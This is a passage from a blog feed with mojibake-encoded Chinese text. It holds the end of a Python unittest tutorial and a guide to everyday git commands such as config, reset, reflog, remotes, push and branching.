å¦‚æœtest_mathåœ¨/usr/test/ç›®å½•ä¸‹</span></span><br><span class="line">suite.addTests(unittest.TestLoader().discover(<span class="string">r&#x27;/usr/test/&#x27;</span>))</span><br><span class="line"><span class="comment"># å¯ç”¨æ·»åŠ å•ä¸ªtestcase</span></span><br><span class="line">suite.addTest(TestMath(<span class="string">&#x27;test_add&#x27;</span>))</span><br></pre></td></tr></table></figure>
<ul>
<li>loadTestsFromName(æ¨¡å—å.testcaseå)</li>
<li>loadTestsFromTestCase(testcaseå)</li>
<li>discover(start_dir, pattern=â€™test*.pyâ€™, top_level_dir=None)ã€‚start_diræ˜¯ç›®æ ‡æ–‡ä»¶å¤¹è·¯å¾„ï¼Œunittestä¼šæŸ¥æ‰¾æŒ‡å®šç›®å½•åŠå­ç›®å½•ä¸‹çš„å…¨éƒ¨ç¬¦åˆpatternçš„æ¨¡å—å¹¶æ‰§è¡Œé‡Œé¢çš„TestCaseã€‚<strong>ç”µè„‘ä¸­ä¸èƒ½æœ‰åŒåçš„ç›®æ ‡æ–‡ä»¶å¤¹ï¼Œå¦åˆ™unittestå¯èƒ½æ— æ³•æ‰¾åˆ°æ­£ç¡®çš„ä½ç½®</strong>ã€‚patteré»˜è®¤æ˜¯â€™test*.pyâ€™ã€‚</li>
</ul>
<h1 id="æ­å»ºæµ‹è¯•ç¯å¢ƒ"><a href="#æ­å»ºæµ‹è¯•ç¯å¢ƒ" class="headerlink" title="æ­å»ºæµ‹è¯•ç¯å¢ƒ"></a>æ­å»ºæµ‹è¯•ç¯å¢ƒ</h1><p>TaseCaseçˆ¶ç±»æä¾›äº†<code>setUp()</code>ï¼Œ<code>tearDown()</code>ï¼Œ<code>setUpClass()</code>ï¼Œ<code>tearDownClass()</code>ã€‚æˆ‘ä»¬åœ¨è‡ªå·±çš„æµ‹è¯•ç”¨ä¾‹ä¸­é‡å†™å°±å¯ä»¥äº†ã€‚</p>
<p>setUp()ä¸tearDown()ä¼šåœ¨æ¯ä¸ªæµ‹è¯•ä¹‹å‰æ‰§è¡Œã€‚setUp()è´Ÿè´£æ­å»ºæµ‹è¯•ç¯å¢ƒï¼ŒtearDown()è´Ÿè´£æ¸…ç†ç¯å¢ƒã€‚å¦‚æœsetUp()æ‰§è¡Œå¤±è´¥é‚£ä¹ˆè¿™æ¬¡æµ‹è¯•ä¸ä¼šè¿›è¡Œï¼Œå¦‚æœsetUp()æˆåŠŸæ‰§è¡Œé‚£ä¹ˆä¸ç®¡æµ‹è¯•æ˜¯å¦æˆåŠŸtearDown()éƒ½ä¼šæ‰§è¡Œã€‚</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> unittest</span><br><span class="line"><span class="keyword">from</span> manage <span class="keyword">import</span> create_app, db</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">TestBasic</span>(<span class="params">unittest.TestCase</span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">setUp</span>(<span class="params">self</span>):</span></span><br><span class="line">        self.app = create_app(<span class="string">&#x27;TESTING&#x27;</span>)</span><br><span class="line">        self.app_context = self.app.app_context()</span><br><span class="line">        self.app_context.push()</span><br><span class="line">        self.client = self.app.test_client(use_cookies=<span class="literal">True</span>)</span><br><span class="line">        db.create_all()</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">tearDown</span>(<span class="params">self</span>):</span></span><br><span class="line">        db.session.remove()</span><br><span class="line">        db.drop_all()</span><br><span class="line">        self.app_context.pop()</span><br><span class="line">    </span><br><span class="line">    ...</span><br></pre></td></tr></table></figure>
<p>å¦‚æœæƒ³è¦åœ¨æ‰€ä»¥caseä¹‹å‰æ‰§è¡Œä¸€æ¬¡ç¯å¢ƒå‡†å¤‡ï¼Œæ‰€æœ‰caseä¹‹åæ¸…ç†ç¯å¢ƒï¼Œå¯ç”¨<code>setUpClass()</code>å’Œ<code>tearDownClass()</code>ã€‚ä¸è¿‡è¦å¸¦ä¸Š<code>@classmethod</code>è£…é¥°å™¨ã€‚</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> unittest</span><br><span class="line"><span class="keyword">from</span> manage <span class="keyword">import</span> create_app, db</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">TestBasic</span>(<span class="params">unittest.TestCase</span>):</span></span><br><span class="line"><span class="meta">    @classmethod</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">setUp</span>(<span class="params">cls</span>):</span></span><br><span class="line">        cls.app = create_app(<span class="string">&#x27;TESTING&#x27;</span>)</span><br><span class="line">        cls.app_context = cls.app.app_context()</span><br><span class="line">        cls.app_context.push()</span><br><span class="line">        cls.client = cls.app.test_client(use_cookies=<span class="literal">True</span>)</span><br><span class="line">        db.create_all()</span><br><span class="line"></span><br><span class="line"><span class="meta">    @classmethod</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">tearDown</span>(<span class="params">cls</span>):</span></span><br><span class="line">        db.session.remove()</span><br><span class="line">        db.drop_all()</span><br><span class="line">        cls.app_context.pop()</span><br><span class="line">    </span><br><span class="line">    ...</span><br></pre></td></tr></table></figure>
<h1 id="æ‰§è¡Œæµ‹è¯•åŠæ§åˆ¶è¾“å‡º"><a href="#æ‰§è¡Œæµ‹è¯•åŠæ§åˆ¶è¾“å‡º" class="headerlink" title="æ‰§è¡Œæµ‹è¯•åŠæ§åˆ¶è¾“å‡º"></a>æ‰§è¡Œæµ‹è¯•åŠæ§åˆ¶è¾“å‡º</h1><p>é€šå¸¸æˆ‘ä»¬ä½¿ç”¨<code>unittest.main()</code>å°±ä¼šè°ƒç”¨Test Runnerå¼€å§‹æµ‹è¯•ã€‚å½“ç„¶ä¹Ÿå¯ä»¥æ‰‹åŠ¨æ‰§è¡ŒRunnerã€‚</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    runner = unittest.TextTest.Runner(verbosity=<span class="number">2</span>)</span><br><span class="line">    runner.run(suite)</span><br></pre></td></tr></table></figure>
<p>verbosityè®¾å®šäº†æµ‹è¯•æŠ¥å‘Šçš„è¯¦ç»†ç¨‹åº¦ï¼Œæœ‰0ï¼Œ1ï¼Œ2ä¸‰ç§ã€‚é»˜è®¤å€¼æ˜¯1ï¼Œæ•°å­—è¶Šå¤§è¶Šè¯¦ç»†ã€‚</p>
<p>ä¹Ÿå¯ä»¥æŠŠè¾“å‡ºå†™åˆ°æ–‡ä»¶é‡Œ,å°†æ–‡ä»¶æŒ‡é’ˆä¼ ç»™Runner()é‡Œçš„<code>stream</code>å‚æ•°å°±å¯ä»¥äº†ï¼š</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;/usr/test/report&#x27;</span>, <span class="string">&#x27;w&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    runner = unittest.TextTest.Runner(verbosity=<span class="number">2</span>, stream=f)</span><br><span class="line">    runner.run(suite)</span><br></pre></td></tr></table></figure>
<h1 id="è·³è¿‡æµ‹è¯•"><a href="#è·³è¿‡æµ‹è¯•" class="headerlink" title="è·³è¿‡æµ‹è¯•"></a>è·³è¿‡æµ‹è¯•</h1><p>unittestæä¾›3ç§è·³è¿‡æµ‹è¯•çš„è£…é¥°å™¨ï¼šskip([reason])ã€skipIf(condtion[,reason])ï¼ŒskipUnless(conditon[,reason])ã€‚</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> mathfunc <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> unittest</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">TestMath</span>(<span class="params">unittest.TestCase</span>):</span></span><br><span class="line"><span class="meta">    @unittest.skip(<span class="params"><span class="string">&#x27;è·³è¿‡addå‡½æ•°&#x27;</span></span>)</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">test_add</span>(<span class="params">self</span>):</span></span><br><span class="line">        self.assertTrue(<span class="number">1</span>+<span class="number">2</span>, add(<span class="number">1</span>, <span class="number">2</span>))</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">test_minus</span>(<span class="params">self</span>):</span></span><br><span class="line">        self.assertEqual(<span class="number">2</span>-<span class="number">1</span>, minus(<span class="number">2</span>, <span class="number">1</span>))</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">test_string</span>(<span class="params">self</span>):</span></span><br><span class="line">        self.assertIn(<span class="string">&#x27;h&#x27;</span> <span class="keyword">in</span> string(<span class="string">&#x27;hello&#x27;</span>))</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>è¯­è¨€</category>
      </categories>
      <tags>
        <tag>Python</tag>
      </tags>
  </entry>
  <entry>
    <title>gitå¸¸è§ç”¨æ³•</title>
    <url>/2018/05/23/git%E5%B8%B8%E8%A7%81%E7%94%A8%E6%B3%95/</url>
    <content><![CDATA[<p>ä½¿ç”¨gitä¹Ÿæœ‰ä¸€æ®µæ—¶é—´äº†ï¼Œä¸€ç›´æ²¡æœ‰åšæ€»ç»“ï¼Œåœ¨è¿™é‡Œè®°å½•ä¸€ä¸‹æ–¹ä¾¿ä»¥åæŸ¥çœ‹ã€‚</p>
<span id="more"></span>

<p><strong>é…ç½®gitï¼š</strong></p>
<p>windowsä¸‹ç›´æ¥ä»<a href="https://git-scm.com/downloads">å®˜ç½‘</a>ä¸‹è½½å°±å¯ä»¥äº†ï¼Œå®‰è£…è¿‡ç¨‹æ˜¯å‚»ç“œå¼çš„ï¼Œä¸€è·¯ç‚¹ç¡®å®šå°±OKã€‚å®‰è£…å®Œæˆåå‘ç°å¤šäº†ä¸ªå«<code>git bash</code>çš„ç¨‹åºï¼Œæ‰“å¼€ç¨‹åºä¼šå¼¹å‡ºä¸€ä¸ªå‘½ä»¤è¡Œçª—å£å°±å¯ä»¥äº†ã€‚</p>
<p>linuxä¸‹å®‰è£…gitå¾ˆç®€å•ï¼Œç›´æ¥åœ¨ç»ˆç«¯è¾“å…¥ <code>git</code>ï¼Œç³»ç»Ÿä¼šå‘Šè¯‰ä½ æ˜¯å¦å·²ç»å®‰è£…ã€‚å¦‚æœæ²¡æœ‰å®‰è£…è¿˜ä¼šå‘Šè¯‰ä½ å®‰è£…æ–¹æ³•ã€‚Debian å’Œ Ubantu ä¸‹é€šè¿‡ <code>sudo apt-get install git</code> å°±å¯ä»¥è¿›è¡Œå®‰è£…ã€‚</p>
<p>ç”±äºgitæ˜¯åˆ†å¸ƒå¼ç‰ˆæœ¬æ§åˆ¶ç³»ç»Ÿï¼Œæ‰€ä»¥å¿…é¡»æŒ‡å‡ºæ¯å°æœºå™¨çš„èº«ä»½ã€‚è¿™å°±è¦é…ç½®gitç›¸å…³å˜é‡ï¼š</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git config --global user.username <span class="string">&quot;name&quot;</span></span><br><span class="line">git config --global user.email <span class="string">&quot;email&quot;</span></span><br></pre></td></tr></table></figure>

<p>æœ‰æ—¶å€™æˆ‘ä»¬å‘ç°è‡ªå·±çš„è´¦æˆ·å’Œé‚®ç®±é…ç½®é”™äº†ï¼Œé‡è®¾æˆ‘ä»¬çš„è´¦æˆ·å’Œé‚®ç®±ï¼š</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git config --global --replace-all user.username <span class="string">&quot;new name&quot;</span></span><br><span class="line">git config --global --replace-all user.email <span class="string">&quot;new email&quot;</span></span><br></pre></td></tr></table></figure>

<h2 id="ç‰ˆæœ¬æ§åˆ¶"><a href="#ç‰ˆæœ¬æ§åˆ¶" class="headerlink" title="ç‰ˆæœ¬æ§åˆ¶"></a>ç‰ˆæœ¬æ§åˆ¶</h2><h3 id="åˆ›å»ºç‰ˆæœ¬åº“"><a href="#åˆ›å»ºç‰ˆæœ¬åº“" class="headerlink" title="åˆ›å»ºç‰ˆæœ¬åº“"></a>åˆ›å»ºç‰ˆæœ¬åº“</h3><p>ç›®æ ‡æ–‡ä»¶å¤¹ä¸‹ï¼Œæ‰“å¼€ç»ˆç«¯è¾“å…¥ï¼š</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git init</span><br></pre></td></tr></table></figure>

<p>è¿™å°±ä¸ºè¿™ä¸ªæ–‡ä»¶å¤¹åˆ›å»ºäº†ä¸€ä¸ªç‰ˆæœ¬åº“ï¼Œæœ‰äº†ç‰ˆæœ¬åº“å°±å¯ä»¥å¼€å§‹ä½¿ç”¨ git çš„å„é¡¹åŠŸèƒ½äº†ã€‚</p>
<h3 id="çŠ¶æ€"><a href="#çŠ¶æ€" class="headerlink" title="çŠ¶æ€"></a>çŠ¶æ€</h3><p>git æœ‰åˆ†åŒºçš„æ¦‚å¿µï¼Œå¹³æ—¶æˆ‘ä»¬æ–°å»ºã€åˆ é™¤ã€ä¿®æ”¹æ–‡ä»¶éƒ½æ˜¯åœ¨<code>å·¥ä½œåŒº</code>ï¼Œé€šè¿‡ <code>git add</code> å‘½ä»¤æŠŠå·¥ä½œåŒºçš„å˜åŠ¨æäº¤åˆ°<code>æš‚å­˜åŒº</code>ï¼ˆstageï¼‰ï¼Œå†ç”¨ <code>git commit</code> æŠŠstageçš„å†…å®¹æäº¤åˆ°<code>åˆ†æ”¯</code>ï¼ˆbranchï¼‰ã€‚</p>
<p>æ¯æ¬¡æˆ‘ä»¬å¯¹æ–‡ä»¶è¿›è¡Œä¿®æ”¹ï¼Œéƒ½ä¼šæ”¹å˜ git çš„çŠ¶æ€ã€‚</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git status <span class="comment">#æŸ¥çœ‹å½“å‰ä»“åº“çš„çŠ¶æ€ï¼ˆæ˜¯å¦æœ‰æ–‡ä»¶è¢«ä¿®æ”¹ï¼Œæœ‰æ–‡ä»¶æ²¡æœ‰commitç­‰ï¼‰</span></span><br><span class="line">git diff file <span class="comment">#æ¯”è¾ƒå·¥ä½œåŒºä¸ç¼“å­˜åŒºçš„ä¸åŒ</span></span><br><span class="line">git diff head  <span class="comment"># æ¯”è¾ƒå·¥ä½œåŒºä¸åˆ†æ”¯çš„ä¸åŒ</span></span><br></pre></td></tr></table></figure>

<h3 id="æ˜¾ç¤ºè¿‡å¾€æäº¤è®°å½•"><a href="#æ˜¾ç¤ºè¿‡å¾€æäº¤è®°å½•" class="headerlink" title="æ˜¾ç¤ºè¿‡å¾€æäº¤è®°å½•"></a>æ˜¾ç¤ºè¿‡å¾€æäº¤è®°å½•</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git <span class="built_in">log</span> <span class="comment"># æ˜¾ç¤ºæäº¤æ—¥å¿—ï¼Œæ¯æ¬¡æäº¤ä¼šæœ‰ä¸€ä¸ªä¸“å±çš„ç‰ˆæœ¬å·ï¼Œé€šè¿‡ç‰ˆæœ¬å·å¯å›æº¯è‡³æœ¬æ¬¡æäº¤</span></span><br><span class="line">git <span class="built_in">log</span> --oneline <span class="comment"># åœ¨ log æ˜¾ç¤ºä¿¡æ¯è¿‡ä¹±æ—¶å¯ä»¥åŠ  --oneline åªæ˜¾ç¤ºæäº¤è®°å½•åŠå…¶ç‰ˆæœ¬å·</span></span><br><span class="line">git <span class="built_in">log</span> --graph --oneline <span class="comment"># æŠŠåˆ†æ”¯è®°å½•ä»¥æ—¶é—´çº¿çš„å½¢å¼æ˜¾ç¤º</span></span><br></pre></td></tr></table></figure>

<p><img src="https://i.loli.net/2020/02/16/U5lM6bayKAHwX1r.png" alt="log"><br><img src="https://i.loli.net/2020/02/16/mO2ACVn9jQaMZJg.png" alt="log--oneline"></p>
<p>HEAD è¡¨ç¤ºå½“å‰ç‰ˆæœ¬ï¼Œå¯ä»¥ç”¨ HEAD^ è¡¨ç¤ºä¸Šä¸€ç‰ˆæœ¬ï¼ŒHEAD^^ è¡¨ç¤ºä¸Šä¸Šç‰ˆæœ¬â€¦ HEAD~100 è¡¨ç¤ºç¬¬å‰ 100 ä¸ªç‰ˆæœ¬ã€‚</p>
<h3 id="ç‰ˆæœ¬å›é€€"><a href="#ç‰ˆæœ¬å›é€€" class="headerlink" title="ç‰ˆæœ¬å›é€€"></a>ç‰ˆæœ¬å›é€€</h3><p>ä½¿ç”¨ git çš„ä¸€ä¸ªä¸»è¦å¥½å¤„å°±æ˜¯ git æä¾›æ–¹ä¾¿çš„ç‰ˆæœ¬æ§åˆ¶ï¼Œå¯ä»¥åœ¨éœ€è¦çš„æ—¶å€™å›é€€åˆ°ä»»æ„ç‰ˆæœ¬ã€‚</p>
<p>ç‰ˆæœ¬å›é€€å‘½ä»¤ï¼š</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git reset --hard ç‰ˆæœ¬å·</span><br></pre></td></tr></table></figure>

<p>ä½†æ˜¯è¿™é‡Œæœ‰ä¸ªé—®é¢˜ï¼šå½“æˆ‘ä»¬å›åˆ°å†å²ç‰ˆæœ¬åï¼Œ<code>git log</code> å‘½ä»¤å°±æ— æ³•æ˜¾ç¤ºæœ€æ–°ç‰ˆæœ¬çš„ç‰ˆæœ¬å·ã€‚ç›¸å½“äºæˆ‘ä»¬ç©¿è¶Šåˆ°è¿‡å»ï¼Œå´æ²¡åŠæ³•å›æ¥äº†ã€‚å¹¸å¥½ <code>git relog</code> å‘½ä»¤å¯ä»¥è§£å†³è¿™ä¸ªé—®é¢˜ï¼Œ<code>git reflog</code> è®°å½•äº†æˆ‘ä»¬æ¯æ¬¡åœ¨ç‰ˆæœ¬é—´çš„ç§»åŠ¨ï¼š</p>
<p><img src="https://i.loli.net/2020/02/16/BFnk1zxTIN7Khly.png" alt="reflog"></p>
<p>å¯ä»¥çœ‹åˆ°ï¼Œæˆ‘é€šè¿‡ checkout ä» 174e8dc æ¥åˆ° e346f09ï¼Œè¿™æ ·å°±ä¸æ€•ç©¿è¶Šä¸å›ç°ä»£å•¦~</p>
<h3 id="ç®¡ç†ä¿®æ”¹"><a href="#ç®¡ç†ä¿®æ”¹" class="headerlink" title="ç®¡ç†ä¿®æ”¹"></a>ç®¡ç†ä¿®æ”¹</h3><p>æœ‰æ—¶æˆ‘ä»¬ä¿®æ”¹äº†å·¥ä½œåŒºæˆ–æš‚å­˜åŒºçš„æ–‡ä»¶ï¼Œè¿‡äº†ä¸€ä¼šå„¿åˆåæ‚”äº†ï¼Œå¯ä»¥ç”¨ä¸‹é¢çš„å‘½ä»¤æ’¤é”€è¿™äº›ä¿®æ”¹ï¼Œ<strong>ç›¸å½“äº git add çš„åå‘å‘½ä»¤ï¼Œå³æŠŠæš‚å­˜åŒºæœ€æ–°ç‰ˆæœ¬è½¬ç§»åˆ°å·¥ä½œåŒº</strong>ï¼š</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git checkout -- file</span><br></pre></td></tr></table></figure>

<p>å¦‚æœæ–‡ä»¶å·²ç» add åˆ°äº†æš‚å­˜åŒºï¼Œæƒ³è¦æŠŠå®ƒä»æš‚å­˜åŒºé‡Œæ’¤ä¸‹æ¥ä¹Ÿæ˜¯å¯ä»¥çš„ï¼Œ<strong>ç›¸å½“äº git commit çš„åå‘å‘½ä»¤ï¼Œå³æŠŠåˆ†æ”¯æœ€æ–°ç‰ˆæœ¬è½¬ç§»åˆ°æš‚å­˜åŒº</strong>ï¼š</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git reset HEAD file</span><br></pre></td></tr></table></figure>

<p>é‚£å¦‚æœæ–‡ä»¶å·²ç» commit äº†æ€ä¹ˆç‰ˆæœ¬ï¼Ÿè¿˜è®°å¾—å‰é¢çš„ç‰ˆæœ¬å›é€€å‘½ä»¤å—ï¼Ÿç›´æ¥å›é€€å°±å¥½å•¦ï¼</p>
<h3 id="æ˜¾ç¤ºæäº¤è®°å½•"><a href="#æ˜¾ç¤ºæäº¤è®°å½•" class="headerlink" title="æ˜¾ç¤ºæäº¤è®°å½•"></a>æ˜¾ç¤ºæäº¤è®°å½•</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git <span class="built_in">log</span> <span class="comment"># æ˜¾ç¤ºæäº¤æ—¥å¿—ï¼Œæ¯æ¬¡æäº¤ä¼šæœ‰ä¸€ä¸ªä¸“å±çš„ç‰ˆæœ¬å·ï¼Œé€šè¿‡ç‰ˆæœ¬å·å¯å›æº¯è‡³æœ¬æ¬¡æäº¤</span></span><br><span class="line">git <span class="built_in">log</span> --oneline <span class="comment"># åœ¨ log æ˜¾ç¤ºä¿¡æ¯è¿‡ä¹±æ—¶å¯ä»¥åŠ  --oneline åªæ˜¾ç¤ºæäº¤è®°å½•åŠå…¶ç‰ˆæœ¬å·</span></span><br><span class="line">git <span class="built_in">log</span> --graph --oneline <span class="comment"># æŠŠåˆ†æ”¯è®°å½•ä»¥æ—¶é—´çº¿çš„å½¢å¼æ˜¾ç¤º</span></span><br></pre></td></tr></table></figure>

<p><img src="https://i.loli.net/2020/02/16/U5lM6bayKAHwX1r.png" alt="log"><br><img src="https://i.loli.net/2020/02/16/mO2ACVn9jQaMZJg.png" alt="log--oneline"></p>
<p>HEAD è¡¨ç¤ºå½“å‰ç‰ˆæœ¬ï¼Œå¯ä»¥ç”¨ HEAD^ è¡¨ç¤ºä¸Šä¸€ç‰ˆæœ¬ï¼ŒHEAD^^ è¡¨ç¤ºä¸Šä¸Šç‰ˆæœ¬â€¦ HEAD~100 è¡¨ç¤ºç¬¬å‰ 100 ä¸ªç‰ˆæœ¬ã€‚</p>
<h2 id="è¿œç¨‹ä»“åº“"><a href="#è¿œç¨‹ä»“åº“" class="headerlink" title="è¿œç¨‹ä»“åº“"></a>è¿œç¨‹ä»“åº“</h2><p>è¦å…ˆåœ¨ Github ä¸­æ·»åŠ è¿™å°æœºå™¨çš„ ssh å¯†é’¥ä»¥å…è®¸ä½ æŠŠæœ¬åœ°æ–‡ä»¶ä¼ åˆ° Github ä¸Šã€‚æ‰§è¡Œï¼š</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ssh-keygen -t rsa -C <span class="string">&quot;email&quot;</span></span><br></pre></td></tr></table></figure>

<p>è¿™æ¡å‘½ä»¤ä¼šåœ¨å½“å‰æ–‡ä»¶å¤¹ä¸‹ç”Ÿæˆ <code>.ssh</code> æ–‡ä»¶å¤¹ï¼Œé‡Œé¢æœ‰ä¸¤ä¸ªæ–‡ä»¶ï¼š<code>id_rsa</code> å’Œ <code>id_rsa.pub</code>ã€‚å¸¦ pub çš„æ˜¯å…¬é’¥ï¼ŒæŠŠ <code>id_rsa.pub</code> é‡Œçš„å†…å®¹æ·»åŠ åˆ° Github ä¸Šã€‚</p>
<p>æƒ³æŠŠ Github ä¸­çš„ä»“åº“å’Œæœ¬åœ°ä»“åº“å…³è”èµ·æ¥ï¼Œé€šè¿‡è¿™æ¡å‘½ä»¤å¯ä»¥å®ç°ï¼Œxxxxx æ˜¯è¿œç¨‹ä»“åº“çš„åœ°å€ï¼š</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git remote add origin xxxxx</span><br></pre></td></tr></table></figure>

<p>origin æ˜¯è¿™ä¸ª git æœ¬åœ°ä»“åº“å¯¹è¿œç¨‹ä»“åº“çš„ç§°å‘¼ï¼Œä¹Ÿå¯ä»¥ç”¨åˆ«çš„åå­—å¦‚ devã€test ç­‰ï¼Œä½†æ˜¯é€šå¸¸éƒ½ç”¨originã€‚</p>
<p>åˆ é™¤æœ¬åœ°ä»“åº“ä¸è¿œç¨‹ä»“åº“çš„å…³è”ä¹Ÿå¾ˆç®€å•ï¼š</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git remote remove origin</span><br></pre></td></tr></table></figure>

<h3 id="å…‹éš†è¿œç¨‹ä»“åº“"><a href="#å…‹éš†è¿œç¨‹ä»“åº“" class="headerlink" title="å…‹éš†è¿œç¨‹ä»“åº“"></a>å…‹éš†è¿œç¨‹ä»“åº“</h3><p>æœ‰æ—¶å€™æˆ‘ä»¬åœ¨ Github ä¸Šå¯èƒ½çœ‹åˆ°ä¸€äº›å¾ˆæœ‰æ„æ€çš„åº“ï¼Œå¯ä»¥ç”¨è¿™ä¸ªå‘½ä»¤æŠŠå®ƒä¸‹è½½åˆ°æœ¬åœ°ï¼Œå…¶ä¸­ xxxxx æ˜¯è¿™ä¸ªä»“åº“çš„ç½‘å€ï¼š</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git <span class="built_in">clone</span> xxxxx</span><br></pre></td></tr></table></figure>

<h3 id="æŠŠæœ¬åœ°åº“å†…å®¹æ¨é€åˆ°è¿œç¨‹"><a href="#æŠŠæœ¬åœ°åº“å†…å®¹æ¨é€åˆ°è¿œç¨‹" class="headerlink" title="æŠŠæœ¬åœ°åº“å†…å®¹æ¨é€åˆ°è¿œç¨‹"></a>æŠŠæœ¬åœ°åº“å†…å®¹æ¨é€åˆ°è¿œç¨‹</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git push origin master</span><br></pre></td></tr></table></figure>

<p>å¦‚æœæ˜¯ç¬¬ä¸€æ¬¡æ¨é€ï¼Œå¯ä»¥ä¸ºpushåŠ ä¸Š <code>-u</code> å‚æ•°ï¼Œè¿™æ ·ä»¥åæ¨é€çš„æ—¶å€™å°±ä¸ç”¨å†è¾“å…¥ Github çš„è´¦å·å’Œå¯†ç äº†ã€‚master ä»£è¡¨è¿œç¨‹ä»“åº“çš„ä¸»åˆ†æ”¯ï¼Œå¦‚æœè¦æ¨é€åˆ°å…¶ä»–åˆ†æ”¯å°±æ¢æˆå…¶ä»–åˆ†æ”¯åã€‚</p>
<h3 id="æŠ“å–è¿œç¨‹åº“å†…å®¹"><a href="#æŠ“å–è¿œç¨‹åº“å†…å®¹" class="headerlink" title="æŠ“å–è¿œç¨‹åº“å†…å®¹"></a>æŠ“å–è¿œç¨‹åº“å†…å®¹</h3><p>æŠ“å–è¿œç¨‹ä»“åº“å†…å®¹å¹¶ merge åˆ°æœ¬åœ°</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git pull <span class="comment"># é»˜è®¤æŠ“å– origin ä¸­å’Œå½“å‰åˆ†æ”¯å…³è”çš„è¿œç¨‹åˆ†æ”¯</span></span><br></pre></td></tr></table></figure>

<h3 id="åˆ é™¤è¿œç¨‹ä»“åº“ä¸­çš„æ–‡ä»¶"><a href="#åˆ é™¤è¿œç¨‹ä»“åº“ä¸­çš„æ–‡ä»¶" class="headerlink" title="åˆ é™¤è¿œç¨‹ä»“åº“ä¸­çš„æ–‡ä»¶"></a>åˆ é™¤è¿œç¨‹ä»“åº“ä¸­çš„æ–‡ä»¶</h3><p>å¾ˆå¤šæ—¶å€™éšç€é¡¹ç›®çš„è¿›è¡Œï¼Œè¿œç¨‹ä»“åº“ä¸­ä¸€äº›æ–‡ä»¶ä¸å†è¢«ä½¿ç”¨ï¼Œæˆ–è€…å¹²è„†å°±æ˜¯ä¸å°å¿ƒæäº¤äº†æ²¡å•¥ç”¨çš„æ–‡ä»¶ã€‚å½“ç„¶ï¼Œå¯ä»¥åœ¨ Github ç‚¹å‡»åˆ é™¤æŒ‰é’®è¿›è¡Œåˆ é™¤ï¼Œä½†æ˜¯ç›®å‰ Github åªæä¾›äº†å•ä¸ªæ–‡ä»¶çš„åˆ é™¤ï¼Œå¦‚æœæƒ³è¦åˆ é™¤ä¸€ä¸ªæ–‡ä»¶å¤¹åŠå…¶ä¸‹çš„æ‰€æœ‰æ–‡ä»¶é‚£å·¥ä½œé‡ç®€ç›´ä»¤äººå´©æºƒ orzã€‚</p>
<p>å…¶å®ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡ä»ç‰ˆæœ¬åº“ä¸­åˆ é™¤è¿™ä¸ªæ–‡ä»¶å†æ¨é€åˆ° Github çš„æ–¹å¼åˆ é™¤è¿œç¨‹ä»“åº“ä¸­çš„å†…å®¹ï¼š</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git rm -r --cached file</span><br><span class="line">git commit -m <span class="string">&quot;delete file&quot;</span></span><br><span class="line">git push origin master</span><br></pre></td></tr></table></figure>

<p><code>-r</code> è¡¨ç¤ºé€’å½’åˆ é™¤ï¼Œè¿™åœ¨ file è¡¨ç¤ºæ–‡ä»¶å¤¹æ—¶å°¤å…¶æœ‰ç”¨ã€‚<code>--cached</code> è¡¨ç¤ºå¯¹ç‰ˆæœ¬åº“ä¸­çš„ç¼“å­˜è¿›è¡Œæ“ä½œï¼Œè¿™æ ·å°±ä¸ä¼šæŠŠæœ¬åœ°æ–‡ä»¶ç»™åˆ é™¤äº†~</p>
<h2 id="åˆ†æ”¯"><a href="#åˆ†æ”¯" class="headerlink" title="åˆ†æ”¯"></a>åˆ†æ”¯</h2><p>åˆ›å»ºæ–°åˆ†æ”¯ï¼š</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git branch åˆ†æ”¯å</span><br></pre></td></tr></table></figure>

<p>ç§»åŠ¨åˆ°ä¸€ä¸ªåˆ†æ”¯ï¼š</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git checkout åˆ†æ”¯å</span><br></pre></td></tr></table></figure>

<p>åˆ›å»ºå¹¶ç§»åŠ¨åˆ°ä¸€ä¸ªæ–°åˆ†æ”¯ï¼š</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git checkout -b åˆ†æ”¯å</span><br></pre></td></tr></table></figure>

